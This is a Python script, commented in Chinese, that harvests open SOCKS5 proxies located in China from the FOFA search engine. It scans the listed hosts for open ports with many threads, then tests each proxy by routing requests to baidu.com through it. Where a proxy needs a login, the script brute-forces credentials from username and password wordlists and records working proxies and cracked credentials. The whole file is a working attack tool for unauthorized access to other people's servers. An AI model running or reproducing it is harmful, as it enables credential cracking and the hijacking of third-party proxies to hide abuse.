import requests
from concurrent.futures import ThreadPoolExecutor
import socket
import warnings

warnings.filterwarnings("ignore")

# 固定变量
FOFA_KEY = ""  # 如果没有 Fofa API Key，请留空
FOFA_URL = f"https://fofa.info/api/v1/search/all?key={FOFA_KEY}&qbase64=cHJvdG9jb2w9PSJzb2NrczUiICYmICJWZXJzaW9uOjUgTWV0aG9kOk5vIEF1dGhlbnRpY2F0aW9uKDB4MDApIiAmJiBjb3VudHJ5PSJDTiI=&size=5000"

# 文件名
FOFA_OUTPUT_FILE = "fofa_results.txt"
PORT_OPEN_FILE = "open_ports.txt"
VALID_PROXY_FILE = "valid_proxies.txt"

# 爬取 Fofa 数据并保存到指定文件
def fetch_fofa_data():
    if not FOFA_KEY:
        print("FOFA_KEY 未设置，跳过 Fofa 数据爬取")
        return

    print("正在爬取 Fofa 数据")
    response = requests.get(FOFA_URL)
    data = response.json()

    print("正在提取数据")
    extracted_data = [result[0] for result in data['results']]

    with open(FOFA_OUTPUT_FILE, 'w') as f:
        for it in extracted_data:
            f.write(it + '\n')

    print(f"数据爬取完毕，结果已保存到 {FOFA_OUTPUT_FILE}")

# 测试端口是否开放
def test_port(proxy):
    proxy = proxy.strip()
    ip, port = proxy.split(":")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, int(port)))
        if result == 0:
            with open(PORT_OPEN_FILE, 'a') as f:  # 追加模式
                f.write(proxy + '\n')
        sock.close()
    except socket.error:
        pass

def check_ports():
    print("正在测试端口开放情况")
    try:
        with open(FOFA_OUTPUT_FILE, "r") as f:
            proxies = f.readlines()
    except FileNotFoundError:
        print(f"{FOFA_OUTPUT_FILE} 文件不存在，请检查或手动创建")
        return

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(test_port, proxies)

    print(f"端口检测完毕，结果已保存到 {PORT_OPEN_FILE}")

# 测试代理的有效性，并输出对应的用户名和密码
def test_proxy(proxy):
    try:
        # 尝试无密码代理
        response = requests.get(
            'https://www.baidu.com/',
            proxies={'http': f"socks5://{proxy}", 'https': f"socks5://{proxy}"},
            timeout=6,
            verify=False
        )
        if response.status_code == 200:
            print(f'Working proxy: {proxy}')
            with open(VALID_PROXY_FILE, 'a') as file:  # 追加模式
                file.write(f'socks5://{proxy}\n')
            return
    except:
        pass

    # 尝试使用用户名和密码
    with open('user.txt', 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]
    with open('pass.txt', 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]

    for username in usernames:
        for password in passwords:
            try:
                response2 = requests.get(
                    'https://www.baidu.com/',
                    proxies={
                        'http': f"socks5://{username}:{password}@{proxy}",
                        'https': f"socks5://{username}:{password}@{proxy}"
                    },
                    timeout=2,
                    verify=False
                )
                if response2.status_code == 200:
                    print(f'Working proxy with credentials: {proxy} | Username: {username} | Password: {password}')
                    with open(VALID_PROXY_FILE, 'a') as file:  # 追加模式
                        file.write(f'socks5://{username}:{password}@{proxy}\n')
                    return
            except:
                pass
    print(f'Failed proxy: {proxy}')

def check_proxies():
    print("正在测试代理的有效性")
    try:
        with open(PORT_OPEN_FILE, 'r') as file:
            proxies = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"{PORT_OPEN_FILE} 文件不存在，请检查或手动创建")
        return

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(test_proxy, proxies)

    print(f"代理检测完毕，结果已保存到 {VALID_PROXY_FILE}")

# 主函数
def main():
    fetch_fofa_data()
    check_ports()
    check_proxies()

if __name__ == '__main__':
    main()

